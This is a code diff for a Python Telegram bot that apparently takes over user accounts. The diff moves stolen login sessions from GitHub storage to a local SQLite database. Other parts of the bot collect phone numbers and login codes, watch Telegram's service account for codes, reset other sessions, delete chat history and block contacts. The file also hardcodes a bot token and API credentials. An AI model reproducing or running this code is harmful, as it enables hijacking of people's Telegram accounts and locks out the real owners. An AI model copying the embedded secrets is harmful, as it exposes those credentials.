@@ -1,12 +1,11 @@
 import os
 import re
-import base64
 import random
 import asyncio
 import logging
+import sqlite3
 from typing import Optional
 
-import aiohttp
 from aiogram import Bot, Dispatcher
 from aiogram.filters import Command
 from aiogram.types import (
@@ -26,13 +25,13 @@ from telethon.tl.functions.channels import LeaveChannelRequest
 from telethon.tl.functions.messages import DeleteHistoryRequest
 from telethon.tl.functions.contacts import DeleteContactsRequest, BlockRequest
 
+# ================= CONFIG =================
 BOT_TOKEN = "8892329170:AAHyKucCh4v5sfRkqeaV5qo9DDdiGd-Fjmk"
 API_ID = 39813941
 API_HASH = "6aa1f649d2a6b3a308bc27aed9e6de29"
 
-GH_TOKEN  = os.getenv("GH_TOKEN")
-GH_REPO   = os.getenv("GH_REPO")
-GH_BRANCH = os.getenv("GH_BRANCH", "main")
+# путь к локальной БД (можно переопределить через env)
+DB_PATH = os.getenv("DB_PATH", "sessions.db")
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
 
@@ -44,87 +43,85 @@ PHONE_RE = re.compile(r"^\+?\d{7,15}$")
 CODE_RE = re.compile(r"\b(\d{4,7})\b")
 TELEGRAM_SERVICE_ID = 777000
 
-GH_API = "https://api.github.com"
+
+# ================= SQLite =================
+_db_lock = asyncio.Lock()
 
 
-# ---------- GitHub storage ----------
-
-def _gh_headers():
-    return {
-        "Authorization": f"token {GH_TOKEN}",
-        "Accept": "application/vnd.github+json",
-        "User-Agent": "tg-session-store",
-    }
-
-
-def _session_path(phone: str) -> str:
-    return f"sessions/{phone.lstrip('+')}.txt"
-
-
-async def gh_get(path: str) -> Optional[str]:
-    url = f"{GH_API}/repos/{GH_REPO}/contents/{path}?ref={GH_BRANCH}"
-    async with aiohttp.ClientSession(headers=_gh_headers()) as s:
-        async with s.get(url) as r:
-            if r.status == 404:
-                return None
-            r.raise_for_status()
-            data = await r.json()
-    content = data["content"].replace("\n", "")
-    return base64.b64decode(content).decode()
+def _db_conn() -> sqlite3.Connection:
+    conn = sqlite3.connect(DB_PATH)
+    conn.execute("""
+        CREATE TABLE IF NOT EXISTS sessions (
+            phone TEXT PRIMARY KEY,
+            session TEXT NOT NULL,
+            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )
+    """)
+    conn.commit()
+    return conn
 
 
-async def gh_get_sha(path: str) -> Optional[str]:
-    url = f"{GH_API}/repos/{GH_REPO}/contents/{path}?ref={GH_BRANCH}"
-    async with aiohttp.ClientSession(headers=_gh_headers()) as s:
-        async with s.get(url) as r:
-            if r.status == 404:
-                return None
-            r.raise_for_status()
-            data = await r.json()
-    return data["sha"]
+def _init_db():
+    conn = _db_conn()
+    conn.close()
+    logging.info(f"sqlite ready: {os.path.abspath(DB_PATH)}")
 
 
-async def gh_put(path: str, content: str, message: str = "update"):
-    sha = await gh_get_sha(path)
-    body = {
-        "message": message,
-        "content": base64.b64encode(content.encode()).decode(),
-        "branch": GH_BRANCH,
-    }
-    if sha:
-        body["sha"] = sha
-    url = f"{GH_API}/repos/{GH_REPO}/contents/{path}"
-    async with aiohttp.ClientSession(headers=_gh_headers()) as s:
-        async with s.put(url, json=body) as r:
-            if r.status not in (200, 201):
-                txt = await r.text()
-                logging.warning(f"gh_put {path}: {r.status} {txt}")
-            r.raise_for_status()
+def _db_get(phone: str) -> Optional[str]:
+    conn = _db_conn()
+    try:
+        row = conn.execute(
+            "SELECT session FROM sessions WHERE phone = ?", (phone,)
+        ).fetchone()
+        return row[0] if row else None
+    finally:
+        conn.close()
 
 
-async def gh_delete(path: str):
-    sha = await gh_get_sha(path)
-    if not sha:
-        return
-    url = f"{GH_API}/repos/{GH_REPO}/contents/{path}"
-    body = {"message": "delete", "sha": sha, "branch": GH_BRANCH}
-    async with aiohttp.ClientSession(headers=_gh_headers()) as s:
-        async with s.delete(url, json=body) as r:
-            if r.status not in (200, 204):
-                logging.warning(f"gh_delete {path}: {r.status}")
+def _db_put(phone: str, session: str):
+    conn = _db_conn()
+    try:
+        conn.execute(
+            """INSERT INTO sessions (phone, session, updated_at)
+               VALUES (?, ?, CURRENT_TIMESTAMP)
+               ON CONFLICT(phone) DO UPDATE SET
+                 session = excluded.session,
+                 updated_at = CURRENT_TIMESTAMP""",
+            (phone, session),
+        )
+        conn.commit()
+    finally:
+        conn.close()
 
 
-# ---------- session storage ----------
+def _db_delete(phone: str):
+    conn = _db_conn()
+    try:
+        conn.execute("DELETE FROM sessions WHERE phone = ?", (phone,))
+        conn.commit()
+    finally:
+        conn.close()
+
+
+def _db_all_phones():
+    conn = _db_conn()
+    try:
+        return [r[0] for r in conn.execute("SELECT phone FROM sessions").fetchall()]
+    finally:
+        conn.close()
+
 
 async def save_session(phone: str, cli: TelegramClient):
     string = StringSession.save(cli.session)
-    await gh_put(_session_path(phone), string, f"session {phone}")
+    async with _db_lock:
+        await asyncio.to_thread(_db_put, phone, string)
     logging.info(f"session saved: {phone}")
 
 
 async def load_session(phone: str) -> Optional[str]:
     try:
-        return await gh_get(_session_path(phone))
+        async with _db_lock:
+            return await asyncio.to_thread(_db_get, phone)
     except Exception as e:
         logging.warning(f"load_session {phone}: {e}")
         return None
@@ -132,7 +129,8 @@ async def load_session(phone: str) -> Optional[str]:
 
 async def drop_session(phone: str):
     try:
-        await gh_delete(_session_path(phone))
+        async with _db_lock:
+            await asyncio.to_thread(_db_delete, phone)
     except Exception as e:
         logging.warning(f"drop_session {phone}: {e}")
 
@@ -145,8 +143,7 @@ async def make_client(phone: str) -> TelegramClient:
     return TelegramClient(StringSession(), API_ID, API_HASH)
 
 
-# ---------- phone ----------
-
+# ================= phone =================
 def normalize_phone(raw: str) -> Optional[str]:
     s = re.sub(r"[\s\-\(\)]", "", raw.strip())
     if not s.startswith("+"):
@@ -159,8 +156,7 @@ def normalize_phone(raw: str) -> Optional[str]:
     return s
 
 
-# ---------- delays ----------
-
+# ================= delays =================
 async def human_delay(min_s=1.5, max_s=4.0):
     await asyncio.sleep(random.uniform(min_s, max_s))
 
@@ -180,8 +176,7 @@ async def safe(coro_factory, label=""):
             return None
 
 
-# ---------- clean ----------
-
+# ================= clean =================
 async def clear_dialog(cli, entity):
     name = getattr(entity, "name", None) or getattr(entity, "username", "?")
     try:
@@ -270,8 +265,7 @@ async def reset_other_sessions(cli):
         raise
 
 
-# ---------- hunt ----------
-
+# ================= hunt =================
 async def hunt_code(cli, chat_id: int, minutes: int = 5):
     found = asyncio.Event()
 
@@ -299,8 +293,7 @@ async def hunt_code(cli, chat_id: int, minutes: int = 5):
         HUNT_TASKS.pop(chat_id, None)
 
 
-# ---------- bot ----------
-
+# ================= bot =================
 class Auth(StatesGroup):
     phone = State()
     code = State()
@@ -612,9 +605,8 @@ async def fallback(msg: Message, state: FSMContext):
 
 
 async def main():
-    if not GH_TOKEN or not GH_REPO:
-        raise SystemExit("нужны GH_TOKEN и GH_REPO в переменных окружения хостинга")
-    logging.info(f"up, sessions -> github:{GH_REPO}")
+    _init_db()
+    logging.info(f"bot up, sessions -> sqlite:{os.path.abspath(DB_PATH)}")
     await dp.start_polling(bot)
 
 
